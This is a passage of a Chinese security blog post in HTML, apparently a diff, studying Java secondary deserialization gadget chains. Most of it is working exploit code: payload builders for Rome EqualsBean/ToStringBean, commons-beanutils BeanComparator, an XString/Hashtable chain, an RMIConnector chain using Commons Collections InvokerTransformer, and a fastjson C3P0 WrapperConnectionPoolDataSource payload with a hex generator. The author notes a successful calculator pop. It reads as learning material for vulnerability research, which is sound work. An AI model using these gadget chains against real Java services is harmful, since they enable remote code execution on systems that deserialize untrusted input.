class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h4 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h4><p>当然，我们发现在ObjectBean#equals方法<br>调用到这个方法  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beanEquals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean1</span> <span class="operator">=</span> <span class="built_in">this</span>._obj;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean2</span> <span class="operator">=</span> obj;</span><br><span class="line">    <span class="type">boolean</span> eq;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        eq = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 == <span class="literal">null</span> &amp;&amp; obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        eq = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>._beanClass.isInstance(obj)) &#123;</span><br><span class="line">            eq = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            eq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">                <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; eq &amp;&amp; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                        <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                        <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> pReadMethod.invoke(bean1, NO_PARAMS);</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> pReadMethod.invoke(bean2, NO_PARAMS);</span><br><span class="line">                            eq = <span class="built_in">this</span>.doEquals(value1, value2);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Could not execute equals()&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        eq = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里同样有调用get方法的操作<br>这样可以（理论上不绕过也行也没问题）直接绕过<code>ObjectBean</code><br>直接调用<code>EqualsBean</code>里的equal方法即可  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.beanEquals(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>是否想起了CC7呢？<br>利用Hashtable去调用指定的equal方法，同时可以传入参数(也别忘了反射控制一些值)<br>exp如下  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getPayload</span> <span class="params">(Class clazz, Object payloadObj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">    map1.put(<span class="string">&quot;zZ&quot;</span>, payloadObj);</span><br><span class="line">    map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">    map2.put(<span class="string">&quot;yy&quot;</span>, payloadObj);</span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    table.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    table.put(map2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">    setFieldValue(bean, <span class="string">&quot;_beanClass&quot;</span>, clazz);</span><br><span class="line">    setFieldValue(bean, <span class="string">&quot;_obj&quot;</span>, payloadObj);</span><br><span class="line">    <span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="commons-beanutils"><a href="#commons-beanutils" class="headerlink" title="commons-beanutils"></a>commons-beanutils</h3><p>这个依赖是不是很眼熟呢？在Shiro(二)里面讲到过  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有没有可能在某个compare方法中，调用PropertyUtils.getProperty方法，然后用它调用某个getter方法(以get开头的方法名),然后又触发链子?</span><br></pre></td></tr></table></figure></div>
+<p>之前的写法是  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">setFieldValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure></div>
+<p>简单换一下即  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue&lt;Object&gt; <span class="title function_">getpayload</span><span class="params">(Object object, String string)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">    PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    setFieldValue(comparator,<span class="string">&quot;property&quot;</span>,string);</span><br><span class="line">    setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object,<span class="number">1</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span> priorityQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>成功弹计算机  </p>
+<h3 id="HotSwappableTargetSource-链"><a href="#HotSwappableTargetSource-链" class="headerlink" title="HotSwappableTargetSource 链"></a>HotSwappableTargetSource 链</h3><p>其实还是有不少变种链子的，但是堆起来也没啥价值，这里偶然间看到了spring原生链，果断来学习一下    </p>
+<p>我们前文利用CC7链去触发equal方法<br>现在存在两个个类，可以从equal入，从toString出<br>看 <code>XString#equals(Object)</code><br>这个方法会调用参数 obj2 对象的 toString() 方法：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">null</span> == obj2)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// In order to handle the &#x27;all&#x27; semantics of</span></span><br><span class="line">    <span class="comment">// nodeset comparisons, we always call the</span></span><br><span class="line">    <span class="comment">// nodeset function.</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNodeSet)</span><br><span class="line">    <span class="keyword">return</span> obj2.equals(<span class="built_in">this</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(obj2 <span class="keyword">instanceof</span> XNumber)</span><br><span class="line">      <span class="keyword">return</span> obj2.equals(<span class="built_in">this</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  	<span class="comment">// 调用 obj2 的 toString() 方法</span></span><br><span class="line">    <span class="keyword">return</span> str().equals(obj2.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>所以只需要传入一个 ToStringBean 对象即可<br>等一下，嗯，是不是多此一举了，这篇写的()<br>直接poc  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getpayload</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">asd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, object);</span><br><span class="line">    XString a=<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map1.put(<span class="string">&quot;yy&quot;</span>, a);</span><br><span class="line">    map1.put(<span class="string">&quot;zZ&quot;</span>, asd);</span><br><span class="line">    map2.put(<span class="string">&quot;zZ&quot;</span>, a);</span><br><span class="line">    map2.put(<span class="string">&quot;yy&quot;</span>, asd);</span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    table.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    table.put(map2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>没什么操作倒是，直接可以执行toString方法  </p>
+<p>话说我们打高版本spring原生链的时候好像也有一条toString的链子，感兴趣的可以去看看  </p>
+<h5 id="后补"><a href="#后补" class="headerlink" title="后补"></a>后补</h5><p>上述的思考是基于打hashtable的hash碰撞触发equals方法，其实一般来讲比如HashMap，我们无法通过这种方式hash碰撞，因此才引出上述一个类做中介包裹碰撞~<br>学到后面突然想起来这个时候一个可笑的”恍然大悟”：（</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/">https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/</a></p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>我们学了一些链子，关键在于调用getObject方法进行二次反序列化<br>当然依托于实际环境的依赖情况 </p>
+<h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><p><code>javax.management</code>下一个与远程 rmi 连接器的连接类<br>只要我们可以调用它的connect方法，就可以实现二次反序列化<br>这里一般就是结合InvokerTransformer方法调用实现二次反序列化<br>exp为  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> util.Tool.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC_RMIConnector</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/base64string&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;Poria&quot;</span>);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        run(expMap, <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>细节就不调试了，这个还是很清晰易懂的<br>大BOSS-bladeCC就打了这个二次反序列化()</p>
+<h2 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h2><p>我们之前学习了一个C3P0的链子的打法<br>那里正是存在着二次反序列化的入口<br>配合fastjson反序列化</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;1&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;2&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">        &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:hexstring;&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以这样生成hex字符串  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = serialize(obj);</span><br><span class="line"><span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    \&quot;1\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    \&quot;2\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap:&quot;</span> + bytesToHexString(bytes, bytes.length) + <span class="string">&quot;;\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(hex);</span><br></pre></td></tr></table></figure></div>
+<p>ending~</p>
+<h2 id="参考学习"><a href="#参考学习" class="headerlink" title="参考学习"></a>参考学习</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13340">https://xz.aliyun.com/news/13340</a></p>
+<p><a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/">https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SignedObject"><span class="toc-number">2.</span> <span class="toc-text">SignedObject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rome"><span class="toc-number">2.1.</span> <span class="toc-text">Rome</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">2.1.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ObjectBean"><span class="toc-number">2.1.2.</span> <span class="toc-text">ObjectBean</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EqualsBean"><span class="toc-number">2.1.3.</span> <span class="toc-text">EqualsBean</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commons-beanutils"><span class="toc-number">2.2.</span> <span class="toc-text">commons-beanutils</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HotSwappableTargetSource-%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">HotSwappableTargetSource 链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E8%A1%A5"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">后补</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.3.1.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">2.4.</span> <span class="toc-text">后记</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMIConnector"><span class="toc-number">3.</span> <span class="toc-text">RMIConnector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WrapperConnectionPoolDataSource"><span class="toc-number">4.</span> <span class="toc-text">WrapperConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0"><span class="toc-number">5.</span> <span class="toc-text">参考学习</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&text=Java二次反序列化学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&is_video=false&description=Java二次反序列化学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java二次反序列化学习&body=Check out this article: https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
